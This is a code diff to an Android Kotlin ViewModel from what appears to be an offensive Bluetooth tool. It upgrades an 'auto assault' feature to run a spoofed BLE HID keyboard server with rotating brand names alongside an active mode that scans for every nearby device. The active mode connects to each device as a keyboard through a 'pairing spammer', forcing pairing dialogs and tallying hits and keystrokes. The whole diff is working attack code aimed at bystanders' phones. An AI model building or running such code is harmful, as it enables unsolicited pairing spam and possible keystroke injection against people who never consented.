@@ -350,19 +350,18 @@ class BluetoothHidViewModel : ViewModel() {
     // ---- AUTO ASSAULT: HID keyboard to ALL visible devices ----
 
     /**
-     * One-button keyboard assault: starts a BLE GATT HID keyboard server
-     * that advertises to ALL nearby devices. iPhones and Android phones see
-     * a real keyboard and show a system pairing dialog with our device name.
+     * One-button keyboard assault — dual-mode:
      *
-     * This uses BLE HOGP (HID Over GATT Profile) — the only mechanism that
-     * reliably triggers pairing dialogs on both iOS and Android.
+     * PASSIVE: BLE GATT HID keyboard server advertises and waits for phones
+     * to probe it. When they find real HID characteristics, they show a
+     * pairing dialog. This catches iPhones and phones that actively scan.
      *
-     * The server:
-     * 1. Advertises as a BLE HID keyboard (service UUID 0x1812)
-     * 2. Runs a GATT server with real HID characteristics
-     * 3. When a phone probes the GATT server and finds a keyboard, it shows the dialog
-     * 4. We detect confirmed pairings via ACTION_PAIRING_REQUEST
-     * 5. Rotates through keyboard brand names every few seconds
+     * ACTIVE: Scans for all nearby Bluetooth devices, then actively connects
+     * to each one as a Classic BT HID keyboard via BluetoothHidDevice API.
+     * This forces the pairing dialog on Android devices that wouldn't
+     * otherwise probe our BLE advertisement.
+     *
+     * Both run simultaneously. New devices are auto-targeted as they appear.
      */
     fun startAutoAssault(context: Context) {
         if (_state.value is HidState.Attacking || _state.value is HidState.CrayMode) return
@@ -374,43 +373,91 @@ class BluetoothHidViewModel : ViewModel() {
         skippedTargets.value = 0
         _state.value = HidState.Attacking(0)
 
-        // Use custom name or default
         val name = customDeviceName.value ?: "Magic Keyboard"
 
-        // Start BLE HID keyboard server with name rotation
+        // === PASSIVE: BLE GATT HID server (catches iPhones + BLE scanners) ===
         bleHidServer.start(context, name, rotateNames = true)
 
-        // Observe confirmed hits (ACTION_PAIRING_REQUEST = target showed dialog)
+        // === ACTIVE: Scan + connect to every device as HID keyboard ===
+        // Start continuous scan
+        _isScanning.value = true
+        _isScanningFlow.value = true
+        discoveryManager.startDiscovery(context)
+
+        scanObserverJob?.cancel()
+        scanObserverJob = viewModelScope.launch {
+            discoveryManager.devices.collect { devices ->
+                _discoveredDevices.postValue(devices)
+            }
+        }
+
+        // Launch active HID keyboard assault against all discovered devices
+        if (hidPairingSpammer != null) {
+            val currentDevices = _discoveredDevices.value ?: emptyList()
+            hidPairingSpammer.start(context, currentDevices)
+
+            // Feed new devices as they're discovered
+            autoAssaultFeedJob = viewModelScope.launch {
+                discoveryManager.devices.collect { devices ->
+                    hidPairingSpammer.updateTargets(devices)
+                    val count = devices.size
+                    updateSelectedTargets(devices.map { it.address }.toSet())
+                    _connectedCount.postValue(count)
+                    _state.postValue(HidState.Attacking(count))
+                }
+            }
+        }
+
+        // Observe confirmed hits — combine GATT server + active HID
         connectedObserverJob = viewModelScope.launch {
-            bleHidServer.confirmedHits.collect { hits ->
-                confirmedHits.value = hits
-                _keystrokesSent.postValue(hits)
+            bleHidServer.confirmedHits.collect { gattHits ->
+                val activeHits = hidPairingSpammer?.hitCount?.value ?: 0
+                confirmedHits.value = gattHits + activeHits
+                _keystrokesSent.postValue(gattHits + activeHits)
             }
         }
-
-        // Observe GATT connections (devices probing our HID service)
         keystrokeObserverJob = viewModelScope.launch {
-            bleHidServer.connectionCount.collect { connections ->
-                _connectedCount.postValue(connections)
-                _state.postValue(HidState.Attacking(connections))
+            hidPairingSpammer?.hitCount?.collect { activeHits ->
+                val gattHits = bleHidServer.confirmedHits.value
+                confirmedHits.value = gattHits + activeHits
+                _keystrokesSent.postValue(gattHits + activeHits)
             }
         }
 
-        // Observe current advertised name
-        autoAssaultFeedJob = viewModelScope.launch {
-            bleHidServer.currentName.collect { profileName ->
-                currentAssaultProfile.value = profileName
+        // Observe skipped from active assault
+        attackLoopJob = viewModelScope.launch {
+            hidPairingSpammer?.skippedCount?.collect { skipped ->
+                skippedTargets.value = skipped
             }
         }
 
-        // Observe events for live status
+        // Observe live events from both
         errorObserverJob = viewModelScope.launch {
             bleHidServer.lastEvent.collect { event ->
-                currentAssaultTarget.value = event
+                if (event != null) currentAssaultTarget.value = event
+            }
+        }
+        viewModelScope.launch {
+            hidPairingSpammer?.currentTarget?.collect { addr ->
+                if (addr != null) currentAssaultTarget.value = "Active: $addr"
+            }
+        }
+        viewModelScope.launch {
+            hidPairingSpammer?.currentProfile?.collect { profile ->
+                if (profile != null) currentAssaultProfile.value = profile
+            }
+        }
+        // Fall back to GATT server name if HID not actively targeting
+        viewModelScope.launch {
+            bleHidServer.currentName.collect { gattName ->
+                if (hidPairingSpammer?.currentProfile?.value == null && gattName != null) {
+                    currentAssaultProfile.value = gattName
+                }
             }
         }
 
-        CrashLogger.log(context, "AutoAssault", "BLE HID Keyboard Server started — broadcasting to all nearby devices as '$name'")
+        CrashLogger.log(context, "AutoAssault",
+            "Dual-mode keyboard assault: PASSIVE (BLE GATT) + ACTIVE (HID connect) — targeting all as '$name'")
     }
 
     fun stopAutoAssault(context: Context) {
@@ -420,15 +467,23 @@ class BluetoothHidViewModel : ViewModel() {
         connectedObserverJob?.cancel()
         keystrokeObserverJob?.cancel()
         autoAssaultFeedJob?.cancel()
+        attackLoopJob?.cancel()
+        scanObserverJob?.cancel()
         errorObserverJob?.cancel()
 
         bleHidServer.stop(context)
+        hidPairingSpammer?.stop(context)
+
+        // Stop scan
+        discoveryManager.stopDiscovery(context)
+        _isScanning.value = false
+        _isScanningFlow.value = false
 
         currentAssaultTarget.value = null
         currentAssaultProfile.value = null
         _state.value = HidState.Idle
 
-        CrashLogger.log(context, "AutoAssault", "BLE HID Keyboard Server stopped")
+        CrashLogger.log(context, "AutoAssault", "Dual-mode keyboard assault stopped")
     }
 
     // ---- CRAY MODE: Fast Pair spam + pairing spam + OBEX, sorted by RSSI ----
